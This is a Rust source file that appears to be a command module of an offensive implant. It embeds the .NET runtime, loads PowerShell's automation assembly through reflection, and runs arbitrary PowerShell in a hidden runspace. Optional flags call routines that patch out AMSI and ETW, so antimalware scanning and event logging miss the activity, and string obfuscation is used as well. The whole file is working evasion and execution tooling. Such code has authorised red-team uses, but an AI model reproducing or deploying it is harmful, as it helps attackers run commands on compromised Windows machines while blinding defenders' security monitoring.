use crate::internal::patches::{patch_amsi, patch_etw};
use clroxide::{
    clr::Clr,
    primitives::{_Assembly, wrap_method_arguments, wrap_string_in_variant},
};
use fmtools::format; // using obfstr to obfuscate

unsafe fn runspace_execute(command: &str) -> Result<String, String> {
    // Initialize the CLR
    let mut clr = Clr::context_only(None)?;
    let context = clr.get_context()?;
    let app_domain = context.app_domain;
    let mscorlib = (*app_domain).load_library("mscorlib")?;

    // Load the 'System.Management.Automation' assembly
    // We need a bit of .NET hackery here, since (*app_domain).load_library() does not support LoadWithPartialName
    // As a result, using that function would need the assembly to exist in the current executable's directory
    let assembly_type = (*mscorlib).get_type("System.Reflection.Assembly")?;
    let assembly_load_with_partial_name_fn = (*assembly_type).get_method_with_signature(
        "System.Reflection.Assembly LoadWithPartialName(System.String)",
    )?;
    let automation_variant = (*assembly_load_with_partial_name_fn).invoke(
        wrap_method_arguments(vec![wrap_string_in_variant("System.Management.Automation")])?,
        None,
    )?;
    let automation: *mut _Assembly = automation_variant
        .Anonymous
        .Anonymous
        .Anonymous
        .byref
        .cast();

    // Get types
    let psobject_type = (*automation).get_type("System.Management.Automation.PSObject")?;
    let runspace_factory_type =
        (*automation).get_type("System.Management.Automation.Runspaces.RunspaceFactory")?;
    let runspace_pipeline_commands_type =
        (*automation).get_type("System.Management.Automation.Runspaces.CommandCollection")?;
    let runspace_pipeline_reader_type = (*automation).get_type(
        "System.Management.Automation.Runspaces.PipelineReader`1[System.Management.Automation.PSObject]"
    )?;
    let runspace_pipeline_type =
        (*automation).get_type("System.Management.Automation.Runspaces.Pipeline")?;
    let runspace_type =
        (*automation).get_type("System.Management.Automation.Runspaces.Runspace")?;

    // Get functions
    let commands_addscript_fn = (*runspace_pipeline_commands_type)
        .get_method_with_signature("Void AddScript(System.String)")?;
    let pipeline_create_fn = (*runspace_type).get_method_with_signature(
        "System.Management.Automation.Runspaces.Pipeline CreatePipeline()",
    )?;
    let pipeline_getoutput_fn = (*runspace_pipeline_type).get_method_with_signature(
        "System.Management.Automation.Runspaces.PipelineReader`1[System.Management.Automation.PSObject] get_Output()"
    )?;
    let pipeline_invoke_async_fn =
        (*runspace_pipeline_type).get_method_with_signature("Void InvokeAsync()")?;
    let pipeline_reader_read_fn = (*runspace_pipeline_reader_type)
        .get_method_with_signature("System.Management.Automation.PSObject Read()")?;
    let psobject_tostring_fn =
        (*psobject_type).get_method_with_signature("System.String ToString()")?;
    let runspace_create_fn = (*runspace_factory_type).get_method_with_signature(
        "System.Management.Automation.Runspaces.Runspace CreateRunspace()",
    )?;
    let runspace_dispose_fn = (*runspace_type).get_method("Dispose")?;
    let runspace_open_fn = (*runspace_type).get_method("Open")?;

    // Create the runspace and pipeline
    let runspace = (*runspace_create_fn).invoke_without_args(None)?;
    let pipeline = (*pipeline_create_fn).invoke_without_args(Some(runspace.clone()))?;

    // Open the runspace
    (*runspace_open_fn).invoke_without_args(Some(runspace.clone()))?;

    // Access the pipeline commands property, and add our script
    let pipeline_commands_property = (*runspace_pipeline_type).get_property("Commands")?;
    let commands = (*pipeline_commands_property).get_value(Some(pipeline.clone()))?;
    (*commands_addscript_fn).invoke(
        wrap_method_arguments(vec![wrap_string_in_variant(
            format!({command}" | Out-String").as_str(),
        )])?,
        Some(commands),
    )?;

    // Invoke the pipeline asynchroneously
    (*pipeline_invoke_async_fn).invoke_without_args(Some(pipeline.clone()))?;

    // Read the output (due to the use of Out-String, we know that only one string object is returned)
    let reader = (*pipeline_getoutput_fn).invoke_without_args(Some(pipeline.clone()))?;
    let reader_read = (*pipeline_reader_read_fn).invoke_without_args(Some(reader.clone()))?;
    let reader_read_tostring =
        (*psobject_tostring_fn).invoke_without_args(Some(reader_read.clone()))?;
    let output = reader_read_tostring
        .Anonymous
        .Anonymous
        .Anonymous
        .bstrVal
        .to_string();

    // Clean up the runspace
    (*runspace_dispose_fn).invoke_without_args(Some(runspace.clone()))?;

    Ok(output)
}

fn parse_arg_to_bool(s: &str) -> bool {
    matches!(s, "1")
}

pub(crate) fn powershell(args: &[String]) -> String {
    let mut result = String::new();
    let patch_amsi_arg = args.first().map_or(false, |s| parse_arg_to_bool(s));
    let block_etw_arg = args.get(1).map_or(false, |s| parse_arg_to_bool(s));
    let command = &args[2..].join(" ");

    if command.is_empty() {
        return format!("Invalid number of arguments received. Usage: 'powershell <BYPASSAMSI=0> <BLOCKETW=0> [command]'.");
    }

    if patch_amsi_arg {
        match patch_amsi() {
            Ok(out) => result.push_str(&format!({out}"\n")),
            Err(err) => result.push_str(&format!({err}"\n")),
        }
    }

    if block_etw_arg {
        match patch_etw() {
            Ok(out) => result.push_str(&format!({out}"\n")),
            Err(err) => result.push_str(&format!({err}"\n")),
        }
    }

    match unsafe { runspace_execute(command) } {
        Ok(out) => result.push_str(&out),
        Err(err) => result.push_str(&err),
    }

    result
}
